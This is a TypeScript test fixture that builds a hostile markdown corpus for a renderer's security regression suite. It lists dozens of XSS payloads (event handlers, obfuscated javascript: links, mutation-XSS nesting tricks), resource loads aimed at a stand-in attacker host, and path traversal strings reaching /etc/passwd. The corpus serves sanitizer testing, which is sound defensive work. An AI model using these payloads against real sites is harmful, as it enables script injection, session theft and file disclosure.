/**
 * Hostile markdown corpus for the permanent regression suite. Every executing
 * payload tries to pop a dialog and call the canary (`window.__pwn` and
 * `top.__pwn`); every network payload points at an address that must never see
 * a request from the browser: a `.invalid` host or a loopback port nobody
 * listens on.
 */

export const ATTACKER = "https://attacker.invalid";

export type Payload = readonly [id: string, markdown: string];

export interface Corpus {
  families: Record<string, Payload[]>;
}

export function buildCorpus(deadPort: number): Corpus {
  const A = `http://127.0.0.1:${String(deadPort)}`;
  const B = `${A}/b`;
  const X = (t: string): string =>
    `alert('${t}');window.__pwn&&window.__pwn();top.__pwn&&top.__pwn()`;

  const exec: Payload[] = [
    ["script", `<script>${X("script")}</script>`],
    ["img-onerror", `<img src=x onerror="${X("img-onerror")}">`],
    ["svg-onload", `<svg onload="${X("svg-onload")}"></svg>`],
    ["details-ontoggle", `<details open ontoggle="${X("details")}"><summary>x</summary></details>`],
    ["body-onload", `<body onload="${X("body")}">`],
    ["iframe-srcdoc", `<iframe srcdoc="<script>parent.${X("ifr")}</script>"></iframe>`],
    ["object-data", `<object data="javascript:${X("obj")}"></object>`],
    ["embed", `<embed src="${A}/embed">`],
    ["iframe-src", `<iframe src="${ATTACKER}/frame"></iframe>`],
    ["iframe-js", `<iframe src="javascript:${X("ifrjs")}"></iframe>`],
    ["math-href", `<math href="javascript:${X("mathhref")}"><mi>x</mi></math>`],
    ["svg-use", `<svg><use href="${ATTACKER}/sprite.svg#a"></use></svg>`],
    ["svg-script", `<svg><script>${X("svgscript")}</script></svg>`],
    [
      "svg-animate",
      `<svg><a><animate attributeName=href values="javascript:${X("anim")}"/></a></svg>`,
    ],
    ["marquee", `<marquee onstart="${X("marquee")}">x</marquee>`],
    ["input-autofocus", `<input autofocus onfocus="${X("focus")}">`],
    ["video-onerror", `<video src=x onerror="${X("video")}"></video>`],
    ["style-expression", `<div style="width:expression(${X("expr")})">x</div>`],
  ];

  const jsLinks: Payload[] = [
    ["md-js", `[a](javascript:${X("mdjs")})`],
    ["md-js-case", `[a](JaVaScRiPt:${X("mdjscase")})`],
    ["md-js-ent", `[a](&#106;avascript:${X("mdjsent")})`],
    ["md-js-tab", `[a](java&#x09;script:${X("mdjstab")})`],
    ["md-js-nl", `<a href="jav&#x0A;ascript:${X("mdjsnl")}">a</a>`],
    ["md-js-lead", `<a href=" &#x01; javascript:${X("lead")}">a</a>`],
    ["md-vbs", `[a](vbscript:msgbox(1))`],
    ["md-data", `[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)`],
    ["autolink-js", `<javascript:${X("autolink")}>`],
    ["ref-js", `[a][r]\n\n[r]: javascript:${X("refjs")}`],
    [
      "html-js-ent2",
      `<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;${X("ent2")}">a</a>`,
    ],
    ["html-js-colon", `<a href="javascript&colon;${X("colon")}">a</a>`],
    ["md-entity-ctrl", `[x](&#0;javascript:${X("ent0")})`],
    ["md-data-svg", `[x](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)`],
    ["md-js-spaces", `[x](<   javascript:${X("spaces")}>)`],
  ];

  const mxss: Payload[] = [
    ["mxss-svg-style", `<svg><style><img src=x onerror="${X("svgstyle")}"></style></svg>`],
    [
      "mxss-math",
      `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=${X("math")}&gt;">`,
    ],
    [
      "mxss-form-math",
      `<form><math><mtext></form><form><mglyph><style></math><img src onerror="${X("formmath")}">`,
    ],
    [
      "mxss-noscript",
      `<noscript><p title="</noscript><img src=x onerror=${X("noscript")}>"></noscript>`,
    ],
    ["mxss-p-title", `<p title="</p><img src=x onerror=${X("ptitle")}>">x</p>`],
    ["mxss-xmp", `<xmp><img src=x onerror="${X("xmp")}"></xmp>`],
    ["mxss-textarea", `<textarea><img src=x onerror="${X("textarea")}"></textarea>`],
    ["mxss-noembed", `<noembed><img src=x onerror="${X("noembed")}"></noembed>`],
    ["mxss-noframes", `<noframes><img src=x onerror="${X("noframes")}"></noframes>`],
    ["mxss-template", `<template><img src=x onerror="${X("template")}"></template>`],
    ["mxss-svg-p-style", `<svg></p><style><a title="</style><img src=1 onerror=${X("svgp")}>">`],
    [
      "mxss-mglyph",
      `<math><mi><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=${X("mglyph")} src=1>">`,
    ],
    ["mxss-select", `<select><style><img src=x onerror="${X("select")}"></style></select>`],
    [
      "mxss-table-style",
      `<table><td><style></td><img src=x onerror="${X("tstyle")}"></style></td></table>`,
    ],
    ["mxss-title", `<title><img src=x onerror="${X("title")}"></title>`],
    ["mxss-iframe-text", `<iframe><img src=x onerror="${X("ifrtext")}"></iframe>`],
    [
      "mxss-a-in-a",
      `<a href="https://a.example/"><b><a href="https://b.example/" title="</a><img src=x onerror=${X("aina")}>">x</a></b></a>`,
    ],
    [
      "mxss-svg-foreign",
      `<svg><foreignObject><p><img src=x onerror="${X("fo")}"></p></foreignObject></svg>`,
    ],
    [
      "mxss-annot",
      `<math><annotation-xml encoding="text/html"><img src=x onerror="${X("annot")}"></annotation-xml></math>`,
    ],
    ["mxss-svg-desc", `<svg><desc><img src=x onerror="${X("desc")}"></desc></svg>`],
    [
      "mxss-button-div",
      `<p><button><div title="</p><img src=x onerror=${X("btn")}>">x</div></button></p>`,
    ],
    ["mxss-pre-nl", `<pre>\n\n</pre><img src=x onerror="${X("pre")}">`],
    [
      "mxss-table-foster",
      `<table><caption><svg><style></caption><img src=x onerror=${X("foster")}>`,
    ],
    ["mxss-dd-nest", `<dl><dt><dd><table><tr><td><dl title="</dl><img src=x onerror=${X("dl")}>">`],
    ["mxss-deep-nest", `${"<div>".repeat(600)}<svg><style><img src=x onerror="${X("deep")}">`],
    ["mxss-deep-nest-b", `${"<b>".repeat(600)}<img src=x onerror="${X("deepb")}">`],
    ["cmt-short", `<!--><img src=x onerror="${X("cmt1")}">-->`],
    ["cmt-bang", `<!-- --!><img src=x onerror="${X("cmt2")}"> -->`],
    ["cmt-pi", `<?xml ><img src=x onerror="${X("pi")}">?>`],
    ["cmt-cdata", `<![CDATA[><img src=x onerror="${X("cdata")}">]]>`],
    ["cmt-decl", `<!foo><img src=x onerror="${X("decl")}">`],
    ["cmt-in-attr", `<p title="<!--">--><img src=x onerror="${X("cmtattr")}"></p>`],
    ["cmt-svg-cdata", `<svg><![CDATA[</svg><img src=x onerror="${X("svgcdata")}">]]></svg>`],
  ];

  const network: Payload[] = [
    ["img-md-ext", `![a](${A}/md-img)`],
    ["img-attacker", `![a](${ATTACKER}/md-img.png)`],
    ["img-proto-rel", `<img src="//127.0.0.1:${String(deadPort)}/protorel">`],
    ["img-srcset", `<img src="a.png" srcset="${A}/srcset 1x">`],
    ["picture", `<picture><source srcset="${A}/picture"><img src="a.png"></picture>`],
    ["video-poster", `<video poster="${A}/poster"></video>`],
    [
      "table-bg",
      `<table background="${A}/tablebg"><tr><td background="${A}/tdbg">x</td></tr></table>`,
    ],
    ["input-image", `<input type=image src="${A}/inputimg">`],
    ["link-css", `<link rel=stylesheet href="${A}/css">`],
    [
      "link-prefetch",
      `<link rel=prefetch href="${A}/prefetch"><link rel=dns-prefetch href="${A}/dns">`,
    ],
    ["style-import", `<style>@import url(${A}/import);</style>`],
    ["style-url", `<style>p{background:url(${ATTACKER}/styleurl)}</style><p>x</p>`],
    ["style-attr", `<div style="background:url(${A}/styleattr)">x</div>`],
    ["meta-refresh", `<meta http-equiv="refresh" content="0;url=${A}/refresh">`],
    ["base-href", `<base href="${A}/base/"><img src="b.png"><a href="c">c</a>`],
    ["a-ping", `<a ping="${A}/ping" href="${B}/pinghref">p</a>`],
    ["form", `<form action="${A}/form"><button>go</button></form>`],
    ["svg-image", `<svg><image href="${A}/svgimage"></image></svg>`],
    ["audio", `<audio src="${A}/audio" autoplay></audio>`],
    ["img-data", `![a](data:image/svg+xml;base64,PHN2Zy8+)`],
    ["img-blob", `<img src="blob:http://127.0.0.1:${String(deadPort)}/x">`],
  ];

  const paths: Payload[] = [
    [
      "img-abs-same",
      `<img src="/api/repos/2/browse/raw?rev=0000000000000000000000000000000000000000&path=a.png&inline=1">`,
    ],
    ["img-api-settings", `![a](/api/settings)`],
    ["img-abs-full", `<img src="http://127.0.0.1:8097/api/repos/2/browse/raw?path=a.png">`],
    ["img-backslash", `<img src="..\\..\\api\\repos\\2\\x.png">`],
    ["img-unicode-slash", `<img src="..∕..∕x.png">`],
    ["img-enc-dotdot", `![a](%2e%2e/%2e%2e/x.png)`],
    ["img-enc-slash", `![a](..%2f..%2fx.png)`],
    ["img-double-enc", `![a](%252e%252e%252f..%252fx.png)`],
    ["img-dotdot-root", `![a](../../x.png)`],
    ["img-query", `![a](a.png?rev=HEAD&path=../x.png)`],
    ["img-fragment", `![a](a.png#../../x.png)`],
    ["img-ws", `<img src=" a.png ">`],
    ["img-many-dots", `![a](./././a.png)`],
    ["img-svg-file", `![s](evil.svg)`],
    ["img-no-ext", `![a](README.md)`],
    ["link-dotdot", `[escape](../../etc/passwd)`],
    ["link-dotdot-enc", `[escape](%2e%2e/%2e%2e/etc/passwd)`],
  ];

  const links: Payload[] = [
    ["link-tree", `[t](sub/file.md)`],
    ["link-forge-path", `<a href="#" data-amber-path="../../etc">f</a>`],
    ["link-forged-path-ok", `<a href="#" data-amber-path="sub/file.md">forged</a>`],
    ["link-target-self", `<a href="${A}/self" target="_self">s</a>`],
    ["link-target-top", `<a href="${A}/top" target="_top">t</a>`],
    ["link-same-origin", `[s](http://127.0.0.1:8097/api/repos/2/browse/raw?path=a)`],
    ["link-mailto", `[m](mailto:a@b.c?subject=x)`],
    ["link-ws", `[x](<http://a b>)`],
    ["link-tel", `[t](tel:123)`],
    ["link-file", `[f](file:///etc/passwd)`],
    ["link-blob", `[b](blob:http://127.0.0.1:${String(deadPort)}/x)`],
    ["link-https", `[ext](${ATTACKER}/clicked)`],
    ["linkify", `see www.example.com and ${A}/linkify and foo@bar.com`],
  ];

  const attrs: Payload[] = [
    [
      "attr-id-name",
      `<img name="documentElement" id="documentElement" src="a.png"><form name=x><a id=probe name=probe>p</a>`,
    ],
    ["attr-class", `<p class="x" dir=rtl lang=ar style="color:red" hidden>x</p>`],
    ["attr-width-huge", `<img src="a.png" width="1" height="99999">`],
    ["attr-colspan", `<table><tr><td colspan="99999" rowspan="99999">x</td></tr></table>`],
    ["attr-is", `<p is="x-y">x</p>`],
    ["attr-xlink", `<a xlink:href="javascript:${X("xlink")}">x</a>`],
    [
      "attr-title-ent",
      `<a title="&quot;&gt;&lt;img src=x onerror=${X("titleent")}&gt;" href="https://e.example/">x</a>`,
    ],
    ["attr-align", `<p align="center;background:url(${A}/align)">x</p>`],
    ["attr-start", `<ol start="-1"><li>x</li></ol>`],
    ["attr-dup", `<a href="https://ok.example/" href="javascript:${X("dup")}">x</a>`],
    ["align-center", `<p align="center">centered</p>`],
    ["md-html-inline-break", `x <img\nsrc=x\nonerror="${X("mdbreak")}">`],
    ["md-code-html", "`<img src=x onerror=alert(1)>` and\n\n    <img src=x onerror=alert(1)>"],
    ["md-table-align", `| a | b |\n|:-:|--:|\n| <img src=x onerror="${X("tbl")}"> | x |`],
    ["md-link-title", `[x](https://e.example/ "a\\" onmouseover=\\"${X("ltitle")}")`],
    ["md-img-title", `![x](a.png "t\\" onerror=\\"${X("ititle")}")`],
    ["md-autolink-mail", `<mailto:x@y.z?body=<img>>`],
  ];

  // A NUL byte makes git and the app treat the file as binary: it must never render as markdown.
  const nul: Payload[] = [["img-nul", `<img src="a\u0000.png">`]];

  return { families: { exec, jsLinks, mxss, network, paths, links, attrs, nul } };
}

/** The payload ids that make up the root README, one per attack shape. */
export const README_IDS = [
  "script",
  "img-onerror",
  "svg-onload",
  "iframe-srcdoc",
  "object-data",
  "embed",
  "md-js",
  "md-js-ent",
  "md-js-tab",
  "md-js-nl",
  "md-vbs",
  "md-data",
  "mxss-svg-style",
  "mxss-math",
  "mxss-form-math",
  "mxss-noscript",
  "meta-refresh",
  "base-href",
  "form",
  "style-import",
  "style-url",
  "style-attr",
  "img-md-ext",
  "img-attacker",
  "img-proto-rel",
  "img-abs-same",
  "img-srcset",
  "link-forge-path",
  "link-target-self",
  "img-dotdot-root",
  "link-dotdot",
  "link-https",
] as const;
